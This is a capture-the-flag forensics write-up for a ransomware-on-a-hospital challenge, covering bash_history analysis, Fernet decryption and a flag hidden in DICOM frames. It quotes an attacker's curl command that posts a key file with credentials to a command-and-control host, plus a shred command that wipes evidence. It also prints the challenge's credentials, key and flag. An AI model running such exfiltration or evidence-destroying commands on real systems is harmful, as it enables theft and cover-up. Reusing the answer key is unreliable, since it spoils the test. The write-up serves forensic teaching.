# Ransomware Hospital 1

| Field       | Value                          |
|-------------|--------------------------------|
| Platform    | Rooted 2026 / CaliphAllabs     |
| Category    | forensics                      |
| Difficulty  | Medium                         |
| Points      | 436                            |
| Author      | Kesero                         |

## Description
> El Hospital Aguilera ha sido víctima de un ataque de ransomware a gran escala. Todavía no se sabe el alcance exacto del ciberataque, pero se confirma que ha comprometido archivos médicos críticos de los pacientes de todo el hospital.

Como analista del equipo, debes apoyar al CISO (Adrián Jiménez) en la respuesta técnica al incidente. Se te ha facilitado un volcado de los correos corporativos que tuvieron lugar el día del ciberataque junto con el flujo de información interna generado tras detectar la intrusión.

En este caso, tu objetivo principal es recuperar los archivos médicos cifrados. Necesitamos conocer la magnitud del ciberataque y traer de vuelta los historiales clínicos cuanto antes.

En situaciones de crisis, la diferencia entre el éxito y el desastre radica en la capacidad de mantener la calma e hilar fino. La vida de los pacientes depende de conseguirlo.

Nota: La flag no contiene el carácter guión (-).


## TL;DR
Bash_history analysis reveals the attacker's C2 credentials. The Fernet key and decryption script are downloaded from the C2. After decrypting the medical files, the flag is hidden in a multi-frame DICOM file where each frame contains a character.

## Initial Analysis

### Contents of Evidence.zip
```
home_drgarcia/
├── bash_history
├── pwned.png      (ransomware image)
└── files.enc      (4.8 GB, encrypted files)
```

### bash_history - Attack Chain
```bash
# Attacker 'louden' installs xrdp for remote access
sudo apt install xrdp

# Compresses medical files
zip -r files.zip precursor-lesions/ x-rays/

# Encrypts with ransomware
python3 ransom.py

# Exfiltrates key to C2
curl -X POST http://challs.caliphallabs.com:18971/upload \
  -F "user=louden" -F "password=M4st4rH4ck3r567!" \
  -F "file=@key.txt" -F "path=Hospital"

# Destroys evidence
shred -zvu -n 5 ransom.py files.zip key.txt
```

## Solution Process

### Access to the attacker's C2
Credentials extracted from bash_history:
- URL: `http://challs.caliphallabs.com:18971`
- User: `louden`
- Password: `M4st4rH4ck3r567!`

Login via POST, then navigation to the `Hospital/` directory. Files found:
- `key.txt`: `7mSXZuq6In4lB-u5dnrVAyl0XzTDG-sIi9UV9narLJg=` (Fernet key)
- `decrypt.py`: decryption script
- `credentials.txt`: `drgarcia:drgarcia123321`

### Decryption of files.enc
The `decrypt.py` script uses **Fernet** (AES-128-CBC + HMAC-SHA256). File format:
- Blocks with a 4-byte prefix (big-endian) indicating size
- Each decrypted block contains `FILE_NAME=...` and `CONTENT=...`
- Files are restored to `precursor-lesions/` and `x-rays/` directories

```bash
python3 decrypt.py
# Restores ~150 TIF/PNG files (precursor-lesions) + 29 DICOM (x-rays)
```

### Identification of the flag file
Among the 29 DICOM files in x-rays, `series-flag-00028.dcm` has:
- Patient Name: `FLAG`
- Number of Frames: 55
- Each frame contains a single character rendered in white on a black background

### Flag extraction
Extraction of the 55 frames as PNG and visual reading of each character:

```
Frame  0: c    Frame 10: m    Frame 20: d    Frame 30: r    Frame 40: y    Frame 50: S
Frame  1: l    Frame 11: _    Frame 21: _    Frame 31: e    Frame 41: _    Frame 51: !
Frame  2: c    Frame 12: F    Frame 22: R    Frame 32: _    Frame 42: d    Frame 52: !
Frame  3: t    Frame 13: 1    Frame 23: 4    Frame 33: 4    Frame 43: 4    Frame 53: !
Frame  4: f    Frame 14: l    Frame 24: n    Frame 34: r    Frame 44: n    Frame 54: }
Frame  5: {    Frame 15: 3    Frame 25: S    Frame 35: e    Frame 45: g
Frame  6: D    Frame 16: S    Frame 26: 0    Frame 36: _    Frame 46: 3
Frame  7: 1    Frame 17: _    Frame 27: m    Frame 37: V    Frame 47: r
Frame  8: c    Frame 18: A    Frame 28: w    Frame 38: 3    Frame 48: 0
Frame  9: 0    Frame 19: n    Frame 29: 4    Frame 39: r    Frame 49: u
```

## Flag
```
clctf{D1c0m_F1l3s_And_R4ns0mw4re_4re_v3ry_d4ng3r0uS!!!}
```

## Key Lessons
- bash_history is a forensic gold mine: it reveals the attacker's exact commands, credentials, and C2 URLs
- Attackers who upload keys to their own C2 make recovery easier if access to the server is obtained
- Fernet is a standard Python symmetric encryption scheme (cryptography library) common in simple ransomware
- DICOM is a medical format that supports multi-frame; steganography in individual frames is a creative vector for hiding data
- `shred` destroys local files but cannot erase what has already been exfiltrated to the C2

## References
- Fernet spec: https://github.com/fernet/spec/
- DICOM standard: https://www.dicomstandard.org/
- pydicom library for DICOM file manipulation
